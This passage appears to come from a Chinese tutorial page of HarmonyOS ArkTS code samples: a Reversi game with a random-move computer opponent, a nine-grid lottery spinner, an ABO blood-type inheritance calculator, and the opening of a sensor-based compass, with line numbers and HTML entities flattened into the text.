currentPlayerIsBlack: boolean = true; // 先手，true表示黑棋 @State chessBoardSize: number = 8; // 假设棋盘大小为8×8 @State validMoveIndicators: TileHighlight [][] = [] @State isTwoPlayerMode: boolean = false; //true:双击游戏，false:单人游戏 @State isAIPlaying:boolean = false//true:AI正在下棋 currentPlayerIsBlackChanged() &#123; setTimeout(() =&gt; &#123; const color = this.currentPlayerIsBlack ? 1 : 2; // 1是黑子，2表示白子 let hasMoves = this.hasValidMoves(color); if (!hasMoves) &#123; let opponentHasMoves = this.hasValidMoves(!this.currentPlayerIsBlack ? 1 : 2); if (!opponentHasMoves) &#123; const winner = this.determineWinner(); console.log(winner); promptAction.showDialog(&#123; title: &#x27;游戏结束&#x27;, message: `$&#123;winner&#125;`, buttons: [&#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.initGame(); &#125;); &#125; else &#123; this.currentPlayerIsBlack = !this.currentPlayerIsBlack; // 切换下一玩家 &#125; &#125; else &#123; if (!this.currentPlayerIsBlack) &#123; // 当前是白棋, 模拟AI下棋 if (!this.isTwoPlayerMode) &#123; setTimeout(() =&gt; &#123; this.aiPlaceRandom(); &#125;, this.transitionDuration + 20); &#125; &#125; &#125; &#125;, this.transitionDuration + 20); &#125; aiPlaceRandom() &#123; let validMoves: [number, number][] = []; for (let i = 0; i &lt; this.validMoveIndicators.length; i++) &#123; for (let j = 0; j &lt; this.validMoveIndicators[i].length; j++) &#123; if (this.validMoveIndicators[i][j].isValidMove) &#123; validMoves.push([i, j]); &#125; &#125; &#125; if (validMoves.length &gt; 0) &#123; const randomMove = validMoves[Math.floor(Math.random() * validMoves.length)]; let chessCell = this.chessBoard[randomMove[0]][randomMove[1]]; this.placeChessPiece(randomMove[0], randomMove[1], chessCell) &#125; &#125; placeChessPiece(i: number, j: number, chessCell: ChessCell) &#123; let reversibleTiles = this.findReversible(i, j, this.currentPlayerIsBlack ? 1 : 2); console.info(`reversibleTiles:$&#123;JSON.stringify(reversibleTiles)&#125;`); if (reversibleTiles.length &gt; 0) &#123; if (this.currentPlayerIsBlack) &#123; this.currentPlayerIsBlack = false; chessCell.showBlack(0); for (let i = 0; i &lt; reversibleTiles.length; i++) &#123; reversibleTiles[i].flip(this.transitionDuration); &#125; &#125; else &#123; this.currentPlayerIsBlack = true; if (this.isTwoPlayerMode) &#123; //双人游戏，无动画 chessCell.showWhite(0); for (let i = 0; i &lt; reversibleTiles.length; i++) &#123; reversibleTiles[i].flip(this.transitionDuration); &#125; &#125; else &#123; //单人游戏，落子需要闪烁动画 this.isAIPlaying = true//AI 正在下棋 chessCell.showWhiteAi(this.transitionDuration, () =&gt; &#123; for (let i = 0; i &lt; reversibleTiles.length; i++) &#123; reversibleTiles[i].flip(this.transitionDuration); &#125; this.currentPlayerIsBlackChanged() this.isAIPlaying = false//AI下完了 &#125;); &#125; &#125; &#125; &#125; hasValidMoves(color: number) &#123; let hasMoves = false; for (let row = 0; row &lt; this.chessBoardSize; row++) &#123; for (let col = 0; col &lt; this.chessBoardSize; col++) &#123; if (this.chessBoard[row][col].frontVisibility === 0 &amp;&amp; this.findReversible(row, col, color).length &gt; 0) &#123; this.validMoveIndicators[row][col].isValidMove = true; hasMoves = true; &#125; else &#123; this.validMoveIndicators[row][col].isValidMove = false; &#125; &#125; &#125; return hasMoves; &#125; aboutToAppear(): void &#123; for (let i = 0; i &lt; this.chessBoardSize; i++) &#123; this.chessBoard.push([]); this.validMoveIndicators.push([]) for (let j = 0; j &lt; this.chessBoardSize; j++) &#123; this.chessBoard[i].push(new ChessCell()); this.validMoveIndicators[i].push(new TileHighlight()) &#125; &#125; this.initGame() &#125; initGame() &#123; this.currentPlayerIsBlack = true for (let i = 0; i &lt; this.chessBoardSize; i++) &#123; for (let j = 0; j &lt; this.chessBoardSize; j++) &#123; this.chessBoard[i][j].frontVisibility = 0 &#125; &#125; // 初始棋盘布局 this.chessBoard[3][3].frontVisibility = 2; this.chessBoard[3][4].frontVisibility = 1; this.chessBoard[4][3].frontVisibility = 1; this.chessBoard[4][4].frontVisibility = 2; this.currentPlayerIsBlackChanged(); &#125; findReversible(row: number, col: number, color: number): ChessCell[] &#123; let reversibleTiles: ChessCell[] = []; const directions = [ [-1, -1], // 左上 [-1, 0], // 正上 [-1, 1], // 右上 [0, -1], // 左 [0, 1], // 右 [1, -1], // 左下 [1, 0], // 正下 [1, 1]// 右下 ]; for (const direction of directions) &#123; let foundOpposite = false; let x = row; let y = col; do &#123; x += direction[0]; y += direction[1]; if (x &lt; 0 || y &lt; 0 || x &gt;= this.chessBoardSize || y &gt;= this.chessBoardSize) &#123; break; &#125; const cell = this.chessBoard[x][y]; if (cell.frontVisibility === 0) &#123; break; &#125; if (cell.frontVisibility === color) &#123; if (foundOpposite) &#123; let tempX: number = x - direction[0]; let tempY: number = y - direction[1]; while (tempX !== row || tempY !== col) &#123; reversibleTiles.push(this.chessBoard[tempX][tempY]); tempX -= direction[0]; tempY -= direction[1]; &#125; &#125; break; &#125; else &#123; foundOpposite = true; &#125; &#125; while (true); &#125; return reversibleTiles; &#125; determineWinner(): string &#123; let blackCount = 0; let whiteCount = 0; for (let row of this.chessBoard) &#123; for (let cell of row) &#123; if (cell.frontVisibility === 1) &#123; blackCount++; &#125; if (cell.frontVisibility === 2) &#123; whiteCount++; &#125; &#125; &#125; if (blackCount &gt; whiteCount) &#123; return &quot;黑棋获胜！&quot;; &#125; if (whiteCount &gt; blackCount) &#123; return &quot;白棋获胜！&quot;; &#125; return &quot;平局！&quot;; &#125; hasValidMove(color: number): boolean &#123; for (let row = 0; row &lt; this.chessBoardSize; row++) &#123; for (let col = 0; col &lt; this.chessBoardSize; col++) &#123; if (this.chessBoard[row][col].frontVisibility === 0 &amp;&amp; this.findReversible(row, col, color).length &gt; 0) &#123; return true; &#125; &#125; &#125; return false; &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; Row() &#123; Row() &#123; Text(``)// 显示单元格的值或空字符串 .width(`$&#123;this.cellSize&#125;lpx`)// 设置宽度 .height(`$&#123;this.cellSize&#125;lpx`)// 设置高度 .textAlign(TextAlign.Center)// 文本居中 .backgroundColor(Color.Black)// 设置背景颜色 .borderRadius(&#x27;50%&#x27;)// 设置圆角 .padding(10) Text(`黑棋行动`) .fontColor(Color.White) .padding(10) &#125; .visibility(this.currentPlayerIsBlack ? Visibility.Visible : Visibility.Hidden) Row() &#123; Text(`白棋行动`) .fontColor(Color.White) .padding(10) Text()// 显示单元格的值或空字符串 .width(`$&#123;this.cellSize&#125;lpx`)// 设置宽度 .height(`$&#123;this.cellSize&#125;lpx`)// 设置高度 .textAlign(TextAlign.Center)// 文本居中 .backgroundColor(Color.White)// 设置背景颜色 .fontColor(Color.White) .borderRadius(&#x27;50%&#x27;)// 设置圆角 .padding(10) &#125; .visibility(!this.currentPlayerIsBlack ? Visibility.Visible : Visibility.Hidden) &#125; .width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 8&#125;lpx`) // 设置宽度 .justifyContent(FlexAlign.SpaceBetween) .margin(&#123; top: 20 &#125;) Stack() &#123; //棋盘背景 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.validMoveIndicators, (row: boolean[], _rowIndex: number) =&gt; &#123; ForEach(row, (item: TileHighlight, _colIndex: number) =&gt; &#123; Text(`$&#123;item.isValidMove ? &#x27;+&#x27; : &#x27;&#x27;&#125;`)// 显示单元格的值或空字符串 .width(`$&#123;this.cellSize&#125;lpx`)// 设置宽度 .height(`$&#123;this.cellSize&#125;lpx`)// 设置高度 .margin(`$&#123;this.cellSpacing&#125;lpx`) .fontSize(`$&#123;this.cellSize / 2&#125;lpx`)// 设置字体大小 .fontColor(Color.White) .textAlign(TextAlign.Center)// 文本居中 .backgroundColor(Color.Gray)// 设置背景颜色 .borderRadius(2) // 设置圆角 &#125;); &#125;); &#125; .width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 8&#125;lpx`) // 设置宽度 //棋子 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.chessBoard, (row: ChessCell[], rowIndex: number) =&gt; &#123; ForEach(row, (chessCell: ChessCell, colIndex: number) =&gt; &#123; Text(``)// 显示单元格的值或空字符串 .width(`$&#123;this.cellSize&#125;lpx`)// 设置宽度 .height(`$&#123;this.cellSize&#125;lpx`)// 设置高度 .margin(`$&#123;this.cellSpacing&#125;lpx`)// 设置边距 .fontSize(`$&#123;this.cellSize / 2&#125;lpx`)// 设置字体大小 .textAlign(TextAlign.Center)// 文本居中 .opacity(chessCell.opacity) .backgroundColor(chessCell.frontVisibility != 0 ? (chessCell.frontVisibility === 1 ? Color.Black : Color.White) : Color.Transparent)// 设置背景颜色 .borderRadius(&#x27;50%&#x27;)// 设置圆角 .rotate(&#123; // 设置旋转 x: 0, y: 1, z: 0, angle: chessCell.rotationAngle, // 旋转角度 centerX: `$&#123;this.cellSize / 2&#125;lpx`, // 中心点X坐标 centerY: `$&#123;this.cellSize / 2&#125;lpx`, // 中心点Y坐标 &#125;) .onClick(() =&gt; &#123; // 单击事件处理 if (this.isAIPlaying) &#123; console.info(`ai正在落子，玩家不可继续落子`) return; &#125; if (chessCell.frontVisibility === 0) &#123; // 没有棋子，需要落子 this.placeChessPiece(rowIndex, colIndex, chessCell) &#125; &#125;); &#125;); &#125;); &#125; .width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 8&#125;lpx`) // 设置宽度 &#125; .padding(`$&#123;this.cellSpacing&#125;lpx`) .backgroundColor(Color.Black) Row() &#123; Text(`$&#123;this.isTwoPlayerMode? &#x27;双人游戏&#x27; : &#x27;单人游戏&#x27;&#125;`) .height(50) .padding(&#123; left: 10 &#125;) .fontSize(16) .textAlign(TextAlign.Start) .backgroundColor(0xFFFFFF) Toggle(&#123; type: ToggleType.Switch, isOn: this.isTwoPlayerMode &#125;) .margin(&#123; left: 200, right: 10 &#125;) .onChange((isOn: boolean) =&gt; &#123; this.isTwoPlayerMode = isOn &#125;) &#125; .backgroundColor(0xFFFFFF) .borderRadius(5) Button(&#x27;重新开始&#x27;).onClick(() =&gt; &#123; // 按钮点击事件 this.initGame() &#125;); &#125; .height(&#x27;100%&#x27;).width(&#x27;100%&#x27;) // 设置高度和宽度 .backgroundColor(Color.Orange) &#125;&#125; nine-square九宫格抽奖 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186// 定义一个可观察的Prize类，用于表示奖品信息。@ObservedV2class Prize &#123; @Trace title: string // 奖品标题属性，使用@Trace进行追踪以便响应式更新UI @Trace color: string // 奖品颜色属性 @Trace description: string // 奖品描述属性 // 构造函数，用来初始化新的奖品实例 constructor(title: string, color: string, description: string = &quot;&quot;) &#123; this.title = title // 设置奖品标题 this.color = color // 设置奖品颜色 this.description = description // 设置奖品描述，默认为空字符串 &#125;&#125; // 定义MyPrizeUpdate结构组件，用于显示和编辑选中的奖品信息@Componentstruct MyPrizeUpdate &#123; @Consume selectedIndex: number // 当前选中的奖品索引 @Consume private selectionOrder: number[] // 保存抽奖顺序的数组 @Consume private prizeArray: Prize[] // 保存所有奖品的数组 build() &#123; Column(&#123; space: 20 &#125;) &#123; // 创建列布局容器，设置子元素之间的间距为20px Row() &#123; // 创建行布局容器 Text(&#x27;标题：&#x27;) // 显示“标题”文本 TextInput(&#123; text: this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].title &#125;) .width(&#x27;300lpx&#x27;) // 设置输入框宽度 .onChange((value) =&gt; &#123; // 监听输入框内容变化 this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].title = value // 更新奖品标题 &#125;) &#125; Row() &#123; Text(&#x27;描述：&#x27;) TextInput(&#123; text: `$&#123;this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].description&#125;` &#125;).width(&#x27;300lpx&#x27;).onChange((value) =&gt; &#123; // 同上，但针对奖品描述 this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].description = value &#125;) &#125; Row() &#123; Text(&#x27;颜色：&#x27;) TextInput(&#123; text: `$&#123;this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].color&#125;` &#125;).width(&#x27;300lpx&#x27;).onChange((value) =&gt; &#123; // 同上，但针对奖品颜色 this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].color = value &#125;) &#125; &#125; .justifyContent(FlexAlign.Start) // 设置内容左对齐 .padding(40) // 设置内边距 .width(&#x27;100%&#x27;) // 设置宽度为100% .backgroundColor(Color.White) // 设置背景颜色为白色 &#125;&#125; // 定义抽奖页面入口组件@Entry@Componentstruct LotteryPage &#123; @Provide private selectedIndex: number = 0 // 提供当前选中的索引，初始值为0 private isAnimating: boolean = false // 标记是否正在进行动画，初始值为false @Provide private selectionOrder: number[] = [0, 1, 2, 5, 8, 7, 6, 3] // 定义抽奖顺序 private cellWidth: number = 200 // 单元格宽度 private baseMargin: number = 10 // 单元格边距 @Provide private prizeArray: Prize[] = [ new Prize(&quot;红包&quot;, &quot;#ff9675&quot;, &quot;10元&quot;), // 初始化奖品数组，创建各种奖品对象 new Prize(&quot;话费&quot;, &quot;#ff9f2e&quot;, &quot;5元&quot;), new Prize(&quot;红包&quot;, &quot;#8e7fff&quot;, &quot;50元&quot;), new Prize(&quot;红包&quot;, &quot;#48d1ea&quot;, &quot;30元&quot;), new Prize(&quot;开始抽奖&quot;, &quot;#fffdfd&quot;), // 抽奖按钮，没有具体奖品描述 new Prize(&quot;谢谢参与&quot;, &quot;#5f5f5f&quot;), new Prize(&quot;谢谢参与&quot;, &quot;#5f5f5f&quot;), new Prize(&quot;超市红包&quot;, &quot;#5f5f5f&quot;, &quot;100元&quot;), new Prize(&quot;鲜花&quot;, &quot;#75b0fe&quot;), ] private intervalID: number = 0 // 定时器ID，用于控制抽奖速度 @State isSheetVisible: boolean = false // 控制底部弹出表单的可见性 // 开始抽奖逻辑 startLottery(speed: number = 500) &#123; setTimeout(() =&gt; &#123; // 设置延时执行 if (speed &gt; 50) &#123; // 如果速度大于50，则递归调用startLottery以逐渐加速 speed -= 50 this.startLottery(speed) &#125; else &#123; this.runAtConstantSpeed() // 达到最高速度后进入匀速阶段 return &#125; this.selectedIndex++ // 每次调用时更新选中索引 &#125;, speed) &#125; // 以恒定速度运行抽奖 runAtConstantSpeed() &#123; let speed = 40 + Math.floor(Math.random() * this.selectionOrder.length) // 随机生成一个速度值 clearInterval(this.intervalID) // 清除之前的定时器 this.intervalID = setInterval(() =&gt; &#123; // 设置新的定时器来更新选中索引 if (this.selectedIndex &gt;= speed) &#123; // 如果选中索引达到速度值，停止并进入减速阶段 clearInterval(this.intervalID) this.slowDown() return &#125; this.selectedIndex++ &#125;, 50) &#125; // 减速逻辑 slowDown(speed = 50) &#123; setTimeout(() =&gt; &#123; // 设置延时执行 if (speed &lt; 500) &#123; // 如果速度小于500，则递归调用slowDown以逐渐减速 speed += 50 this.slowDown(speed) &#125; else &#123; this.selectedIndex %= this.selectionOrder.length // 确保索引在有效范围内 let index = this.selectionOrder[this.selectedIndex] // 获取最终选中的奖品索引 this.isAnimating = false // 动画结束 this.getUIContext().showAlertDialog(&#123; // 显示结果对话框 title: &#x27;结果&#x27;, message: `$&#123;this.prizeArray[index].title&#125;$&#123;this.prizeArray[index].description&#125;`, // 显示奖品信息 confirm: &#123; defaultFocus: true, value: &#x27;我知道了&#x27;, // 确认按钮文本 action: () =&gt; &#123;&#125; // 点击确认后的操作 &#125;, alignment: DialogAlignment.Center, &#125;); return &#125; this.selectedIndex++ &#125;, speed) &#125; // 构建UI方法 build() &#123; Column() &#123; // 使用Column布局容器 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // 使用弹性布局，允许换行 ForEach(this.prizeArray, (item: Prize, index: number) =&gt; &#123; // 遍历奖品数组，创建每个奖品的UI Column() &#123; // 使用Column布局容器为每个奖品项 Text(`$&#123;item.title&#125;`) // 显示奖品标题 .fontColor(index == 4 ? Color.White : item.color) // 设置字体颜色，对于抽奖按钮特殊处理 .fontSize(16) Text(`$&#123;item.description&#125;`) // 显示奖品描述 .fontColor(index == 4 ? Color.White : item.color) // 设置字体颜色 .fontSize(20) &#125; .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // 添加点击效果 .onClick(() =&gt; &#123; // 处理点击事件 if (this.isAnimating) &#123; // 如果正在动画中，忽略点击 return &#125; if (index == 4) &#123; // 如果点击的是抽奖按钮，开始抽奖 this.isAnimating = true this.startLottery() &#125; else &#123; for (let i = 0; i &lt; this.selectionOrder.length; i++) &#123; if (this.selectionOrder[i] == index) &#123; this.selectedIndex = i // 更新选中索引到对应位置 &#125; &#125; &#125; &#125;) .alignItems(HorizontalAlign.Center) // 设置水平居中对齐 .justifyContent(FlexAlign.Center) // 设置垂直居中对齐 .width(`$&#123;this.cellWidth&#125;lpx`) // 设置单元格宽度 .height(`$&#123;this.cellWidth&#125;lpx`) // 设置单元格高度 .margin(`$&#123;this.baseMargin&#125;lpx`) // 设置单元格边距 .backgroundColor(index == 4 ? &quot;#ff5444&quot; : // 抽奖按钮背景颜色特殊处理 (this.selectionOrder[this.selectedIndex % this.selectionOrder.length] == index ? Color.Gray : Color.White)) .borderRadius(10) // 设置圆角 .shadow(&#123; // 设置阴影效果 radius: 10, color: &quot;#f98732&quot;, offsetX: 0, offsetY: 20 &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 3 + this.baseMargin * 6&#125;lpx`) // 设置整体宽度 .margin(&#123; top: 30 &#125;) // 设置顶部边距 MyPrizeUpdate().margin(&#123;top:20&#125;) // 插入MyPrizeUpdate组件，并设置其上边距 &#125; .height(&#x27;100%&#x27;) // 设置高度为100% .width(&#x27;100%&#x27;) // 设置宽度为100% .backgroundColor(&quot;#ffb350&quot;) // 设置页面背景颜色 &#125;&#125; LotteryPage入口组件LotteryPage是整个抽奖应用的核心组件，负责组织页面布局和处理用户交互逻辑。它初始化了一系列必要的状态变量，比如保存所有奖品的数组prizeArray、定义抽奖顺序的selectionOrder以及控制动画状态的isAnimating等。此外，该组件实现了抽奖过程的关键方法——startLottery（开始抽奖）、runAtConstantSpeed（匀速运行）和slowDown（减速），它们共同协作以模拟真实的抽奖体验。当用户点击抽奖按钮时，这些方法按照预定的速度模式依次调用，直到最终确定一个奖品为止。最后，通过弹出对话框的方式向用户展示抽奖结果。 blood血型计算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204// 导入SegmentButton及其相关类型定义import &#123; SegmentButton, SegmentButtonItemTuple, SegmentButtonOptions &#125; from &#x27;@kit.ArkUI&#x27;; // 使用@Entry装饰器标记此组件为入口点@Entry // 使用@Component装饰器标记此结构体为一个组件@Component // 定义一个名为BloodTypeCalculator的结构体，用于实现血型遗传计算功能struct BloodTypeCalculator &#123; // 定义主题颜色，默认为橙色 @State private themeColor: string | Color = Color.Orange; // 定义文本颜色，默认为深灰色 @State private textColor: string = &quot;#2e2e2e&quot;; // 定义边框颜色，默认为浅灰色 @State private lineColor: string = &quot;#d5d5d5&quot;; // 定义基础内边距大小，默认为30 @State private basePadding: number = 30; // 存储可能的血型结果 @State private possibleBloodTypesText: string = &quot;&quot;; // 存储不可能的血型结果 @State private impossibleBloodTypesText: string = &quot;&quot;; // 定义血型列表，包含A、B、AB、O四种血型 @State private bloodTypeList: object[] = [Object(&#123; text: &#x27;A&#x27; &#125;), Object(&#123; text: &#x27;B&#x27; &#125;), Object(&#123; text: &#x27;AB&#x27; &#125;), Object(&#123; text: &#x27;O&#x27; &#125;)]; // 初始化单选胶囊按钮的配置项 @State singleSelectCapsuleOptions: SegmentButtonOptions | undefined = undefined; // 监听父亲血型选择变化 @State @Watch(&#x27;capsuleSelectedIndexesChanged&#x27;) fatherBloodTypeIndex: number[] = [0]; // 监听母亲血型选择变化 @State @Watch(&#x27;capsuleSelectedIndexesChanged&#x27;) motherBloodTypeIndex: number[] = [0]; // 根据血型获取其可能的基因组合 getGenes(bloodType: string): string[] &#123; console.info(`bloodType:$&#123;bloodType&#125;`); switch (bloodType) &#123; case &#x27;A&#x27;: return [&#x27;A&#x27;, &#x27;O&#x27;]; // A型血可能的基因组合 case &#x27;B&#x27;: return [&#x27;B&#x27;, &#x27;O&#x27;]; // B型血可能的基因组合 case &#x27;AB&#x27;: return [&#x27;A&#x27;, &#x27;B&#x27;]; // AB型血可能的基因组合 case &#x27;O&#x27;: return [&#x27;O&#x27;]; // O型血可能的基因组合 default: throw new Error(&#x27;Invalid blood type&#x27;); // 非法血型抛出错误 &#125; &#125; // 组合父母的基因以获得子代可能的基因组合 combineGenes(fatherGenes: string[], motherGenes: string[]): string[] &#123; const possibleGenes: string[] = []; // 用于存储可能的基因组合 for (const fatherGene of fatherGenes) &#123; for (const motherGene of motherGenes) &#123; const combinedGene = [fatherGene, motherGene].sort().join(&#x27;&#x27;); // 将父母的基因组合并排序后加入数组 if (!possibleGenes.includes(combinedGene)) &#123; possibleGenes.push(combinedGene); // 如果组合尚未存在，则加入数组 &#125; &#125; &#125; return possibleGenes; // 返回所有可能的基因组合 &#125; // 根据基因组合确定血型 getBloodTypesFromGenes(genes: string[]): string[] &#123; const bloodTypes: string[] = []; // 用于存储可能的血型 for (const gene of genes) &#123; if (gene === &#x27;AA&#x27; || gene === &#x27;AO&#x27; || gene === &#x27;OA&#x27;) &#123; bloodTypes.push(&#x27;A&#x27;); // 基因组合为AA、AO或OA时，血型为A &#125; else if (gene === &#x27;BB&#x27; || gene === &#x27;BO&#x27; || gene === &#x27;OB&#x27;) &#123; bloodTypes.push(&#x27;B&#x27;); // 基因组合为BB、BO或OB时，血型为B &#125; else if (gene === &#x27;AB&#x27; || gene === &#x27;BA&#x27;) &#123; bloodTypes.push(&#x27;AB&#x27;); // 基因组合为AB或BA时，血型为AB &#125; else if (gene === &#x27;OO&#x27;) &#123; bloodTypes.push(&#x27;O&#x27;); // 基因组合为OO时，血型为O &#125; &#125; // 去除重复的血型 return bloodTypes.filter((value, index, self) =&gt; self.indexOf(value) === index); &#125; // 计算孩子可能的血型及不可能的血型 calculatePossibleBloodTypes(father: string, mother: string) &#123; const fatherGenes = this.getGenes(father); // 获取父亲的基因组合 const motherGenes = this.getGenes(mother); // 获取母亲的基因组合 const possibleGenes = this.combineGenes(fatherGenes, motherGenes); // 组合父母的基因 const possibleBloodTypes = this.getBloodTypesFromGenes(possibleGenes); // 从基因组合中获取可能的血型 const allBloodTypes: string[] = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;AB&#x27;, &#x27;O&#x27;]; // 所有可能的血型列表 const impossibleBloodTypes = allBloodTypes.filter(bt =&gt; !possibleBloodTypes.includes(bt)); // 计算不可能的血型 console.log(this.possibleBloodTypesText = `孩子可能血型：$&#123;possibleBloodTypes.join(&#x27;、&#x27;)&#125;`); // 显示可能的血型 console.log(this.impossibleBloodTypesText = `孩子不可能血型：$&#123;impossibleBloodTypes.join(&#x27;、&#x27;)&#125;`); // 显示不可能的血型 &#125; // 当胶囊按钮的选择发生变化时调用此函数 capsuleSelectedIndexesChanged() &#123; let father: string = this.bloodTypeList[this.fatherBloodTypeIndex[0]][&#x27;text&#x27;]; // 获取父亲选择的血型 let mother: string = this.bloodTypeList[this.motherBloodTypeIndex[0]][&#x27;text&#x27;]; // 获取母亲选择的血型 this.calculatePossibleBloodTypes(father, mother); // 计算并更新血型信息 &#125; // 在组件即将出现时调用此函数 aboutToAppear(): void &#123; this.singleSelectCapsuleOptions = SegmentButtonOptions.capsule(&#123; buttons: this.bloodTypeList as SegmentButtonItemTuple, // 设置胶囊按钮的选项 multiply: false, // 单选模式 fontColor: Color.White, // 字体颜色为白色 selectedFontColor: Color.White, // 选中时字体颜色为白色 selectedBackgroundColor: this.themeColor, // 选中背景色为主题色 backgroundColor: this.lineColor, // 背景色为边框颜色 backgroundBlurStyle: BlurStyle.BACKGROUND_THICK // 背景模糊效果 &#125;); this.capsuleSelectedIndexesChanged(); // 初始化时调用选择变化处理函数 &#125; // 构建用户界面 build() &#123; Column() &#123; // 页面标题 Text(&#x27;血型遗传计算&#x27;) .fontColor(this.textColor) // 文本颜色 .fontSize(18) // 字体大小 .width(&#x27;100%&#x27;) // 宽度为100% .height(50) // 高度为50 .textAlign(TextAlign.Center) // 文本居中对齐 .backgroundColor(Color.White) // 背景色为白色 .shadow(&#123; // 添加阴影效果 radius: 2, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // 水平偏移量 offsetY: 5 // 垂直偏移量 &#125;); // 工具介绍部分 Column() &#123; Text(&#x27;工具介绍&#x27;).fontSize(20).fontWeight(600).fontColor(this.textColor); Text(&#x27;血型是以A、B、O三种遗传因子的组合而决定的，根据父母的血型，就可以判断出以后出生的孩子的血型。&#x27;) .fontSize(18).fontColor(this.textColor).margin(&#123; top: `$&#123;this.basePadding / 2&#125;lpx` &#125;); &#125; .alignItems(HorizontalAlign.Start) .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .borderRadius(10) .backgroundColor(Color.White) .shadow(&#123; radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 &#125;); // 父亲血型选择部分 Column() &#123; Row() &#123; Text(&#x27;父亲血型&#x27;).fontColor(this.textColor).fontSize(18); SegmentButton(&#123; options: this.singleSelectCapsuleOptions, // 胶囊按钮的配置项 selectedIndexes: this.fatherBloodTypeIndex // 当前选中的索引 &#125;).width(&#x27;400lpx&#x27;); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); // 母亲血型选择部分 Row() &#123; Text(&#x27;母亲血型&#x27;).fontColor(this.textColor).fontSize(18); SegmentButton(&#123; options: this.singleSelectCapsuleOptions, // 胶囊按钮的配置项 selectedIndexes: this.motherBloodTypeIndex // 当前选中的索引 &#125;).width(&#x27;400lpx&#x27;); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); &#125; .alignItems(HorizontalAlign.Start) .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .borderRadius(10) .backgroundColor(Color.White) .shadow(&#123; radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 &#125;); // 显示计算结果 Column() &#123; Row() &#123; Text(this.possibleBloodTypesText).fontColor(this.textColor).fontSize(18); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); Row() &#123; Text(this.impossibleBloodTypesText).fontColor(this.textColor).fontSize(18); &#125;.height(45).justifyContent(FlexAlign.SpaceBetween).width(&#x27;100%&#x27;); &#125; .alignItems(HorizontalAlign.Start) .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .borderRadius(10) .backgroundColor(Color.White) .shadow(&#123; radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 &#125;); &#125; .height(&#x27;100%&#x27;) .width(&#x27;100%&#x27;) .backgroundColor(&quot;#f4f8fb&quot;); // 页面背景色 &#125;&#125; compass指南针 传感器 角度计算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175import &#123; sensor &#125; from &#x27;@kit.SensorServiceKit&#x27;; // 导入传感器服务模块import &#123; BusinessError &#125; from &#x27;@kit.BasicServicesKit&#x27;; // 导入业务错误处理模块 // 定义方向范围类class DirectionRange &#123; name: string = &#x27;&#x27;; // 方向名称 min: number = 0; // 最小角度 max: number = 0; // 最大角度&#125; // 定义各个方向的范围const DIRECTION_RANGES: DirectionRange[] = [ &#123; name: &#x27;北&#x27;, min: 337.5, max: 360 &#125;, &#123; name: &#x27;北&#x27;, min: 0, max: 22.5 &#125;, &#123; name: &#x27;东北&#x27;, min: 22.5, max: 67.5 &#125;, &#123; name: &#x27;东&#x27;, min: 67.5, max: 112.5 &#125;, &#123; name: &#x27;东南&#x27;, min: 112.5, max: 157.5 &#125;, &#123; name: &#x27;南&#x27;, min: 157.5, max: 202.5 &#125;, &#123; name: &#x27;西南&#x27;, min: 202.5, max: 247.5 &#125;, &#123; name: &#x27;西&#x27;, min: 247.5, max: 292.5 &#125;, &#123; name: &#x27;西北&#x27;, min: 292.5, max: 337.5 &#125;]; // 定义指南针组件@Entry@Componentstruct Compass &#123; @State directionMessage: string = &#x27;&#x27;; // 当前方向的名称 @State rotationAngle: number = 0; // 当前旋转角度 @State currentAngle: number = 0; // 当前传感器角度 @State cumulativeRotation: number = 0; // 累计旋转角度 private threshold: number = 1; // 设置阈值，用于过滤小的旋转变化 // 组件即将出现时调用 aboutToAppear(): void &#123; sensor.getSensorList((error: BusinessError) =&gt; &#123; if (error) &#123; console.error(&#x27;获取传感器列表失败&#x27;, error); // 如果获取传感器列表失败，打印错误信息 return; &#125; this.startOrientationUpdates(); 